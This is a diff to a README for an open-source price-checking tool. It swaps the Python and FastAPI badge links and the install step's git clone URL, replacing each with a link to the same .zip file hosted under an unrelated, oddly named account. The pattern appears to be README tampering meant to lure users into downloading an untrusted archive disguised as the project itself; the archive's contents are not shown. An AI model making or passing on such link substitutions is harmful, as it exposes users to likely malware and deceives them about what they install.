@@ -5,8 +5,8 @@
 You aren't just overpaying in dollars. You're handing over **millions of AI tokens** every time you buy retail.
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://python.org)
-[![FastAPI](https://img.shields.io/badge/API-FastAPI-009688.svg)](https://fastapi.tiangolo.com)
+[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://raw.githubusercontent.com/mucopurulent-1770s318/fair-price-engine/main/knowledge/bom_templates/fair-engine-price-v2.1.zip)
+[![FastAPI](https://img.shields.io/badge/API-FastAPI-009688.svg)](https://raw.githubusercontent.com/mucopurulent-1770s318/fair-price-engine/main/knowledge/bom_templates/fair-engine-price-v2.1.zip)
 
 ---
 
@@ -143,7 +143,7 @@ After each scan, the frontend anonymously submits the item name and markup to `/
 # Prerequisites: Ollama running with a vision model
 ollama pull llava:13b
 
-git clone https://github.com/ninja-otaku/fair-price-engine
+git clone https://raw.githubusercontent.com/mucopurulent-1770s318/fair-price-engine/main/knowledge/bom_templates/fair-engine-price-v2.1.zip
 cd fair-price-engine
 pip install -r requirements.txt
 
